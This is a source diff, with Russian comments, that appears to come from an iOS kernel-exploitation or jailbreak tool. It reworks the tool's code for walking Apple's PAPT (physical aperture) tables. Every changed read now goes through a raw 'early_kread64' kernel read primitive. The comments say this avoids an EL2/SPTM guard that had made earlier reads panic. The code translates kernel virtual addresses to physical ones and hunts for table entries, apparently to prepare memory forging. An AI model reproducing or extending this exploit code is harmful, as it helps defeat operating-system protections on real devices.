@@ -115,19 +115,21 @@ static uint64_t kpZoneVtoP(uint64_t va)
     }
     if (!tbl || !n || n > 512) return 0;
     for (uint64_t i = 0; i < n; i++) {
+        // 1.9.276: читаем таблицу через early_kread64 НАПРЯМУЮ — она лежит в
+        // SPTM-прилегающем регионе (0xfffffff01e…), и kpRead/kreadbuf режут её
+        // EL2-гардом («чтение = паника, пропуск» — 275-я). Сам zalloc резолвит
+        // через неё на EL1 (резолвер 0x87b02e0) — значит читается безопасно.
         if (kp_papt_format == 1) {
             // 16-B fast-path: {va_base@0, start_pfn(u32)@8, count(u24)|flags(u8)@12}
-            uint64_t vaBase = 0; uint32_t startPfn = 0, rawCnt = 0;
-            kreadbuf(tbl + i * 16, &vaBase, 8);
-            kreadbuf(tbl + i * 16 + 8, &startPfn, 4);
-            kreadbuf(tbl + i * 16 + 12, &rawCnt, 4);
+            uint64_t vaBase = early_kread64(tbl + i * 16);
+            uint64_t hi = early_kread64(tbl + i * 16 + 8);
+            uint32_t startPfn = (uint32_t)hi, rawCnt = (uint32_t)(hi >> 32);
             uint64_t np = rawCnt & 0xFFFFFF;
             if (np && va >= vaBase && va < vaBase + np * 0x4000ULL)
                 return (uint64_t)startPfn * 0x4000ULL + (va - vaBase);
             continue;
         }
-        uint64_t q[3] = {0, 0, 0};
-        kreadbuf(tbl + i * 24, q, 24);
+        uint64_t q[3] = { early_kread64(tbl + i * 24), early_kread64(tbl + i * 24 + 8), early_kread64(tbl + i * 24 + 16) };
         uint64_t vaBase = 0, paBase = 0;
         for (int k = 0; k < 2; k++) {
             if ((q[k] & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) { vaBase = q[k]; paBase = q[k ^ 1]; break; }
@@ -7943,12 +7945,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     uint64_t stockT = kread_ptr(ksymbol(libsptm_papt_ranges));
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] PAPT сток: tbl=%#llx n=%llu", (unsigned long long)stockT, (unsigned long long)stockN]);
                     if (kpLooksLikeKernelPointer(stockT)) {
-                        uint8_t se[48];
-                        memset(se, 0, sizeof(se));
-                        if (kpRead(stockT, se, sizeof(se), "papt stock dump", nil))
-                            kpNote(r, [NSString stringWithFormat:@"    stock[0]: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x... | %#018llx %#018llx %#018llx",
-                                      se[0],se[1],se[2],se[3],se[4],se[5],se[6],se[7],se[8],se[9],se[10],se[11],
-                                      *(uint64_t *)se, *(uint64_t *)(se + 8), *(uint64_t *)(se + 16)]);
+                        // 1.9.276: early_kread64 — таблица в SPTM-прилегающем регионе,
+                        // kpRead резал её EL2-гардом (275-я «чтение = паника, пропуск»).
+                        uint64_t q0 = early_kread64(stockT), q1 = early_kread64(stockT + 8), q2 = early_kread64(stockT + 16);
+                        kpNote(r, [NSString stringWithFormat:@"    stock[0]: %#018llx %#018llx %#018llx",
+                                  (unsigned long long)q0, (unsigned long long)q1, (unsigned long long)q2]);
                     }
                     NSArray<NSNumber *> *pts = [self libsptmBlockPointeesWithLog:nil];
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] PAPT охота: %d pointee-кандидатов", (int)pts.count]);
@@ -7956,7 +7957,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         uint64_t cand = pv.unsignedLongLongValue;
                         uint8_t f2[48];
                         memset(f2, 0, sizeof(f2));
-                        if (!kpRead(cand, f2, sizeof(f2), "papt hunt", nil)) continue;
+                        for (uint32_t ri = 0; ri < 48; ri += 8) *(uint64_t *)(f2 + ri) = early_kread64(cand + ri);   // 1.9.276: early_kread64 напрямую — EL2-гард kpRead резал pointee'ы (275-я)
                         BOOL ok24 = kpPaptEntryPlausible(f2) && kpPaptEntryPlausible(f2 + 24);
                         if (!ok24) {
                             // 16-B формат: {va_base, start_pfn(u32)@8, count(u24)@12} — записи с +8
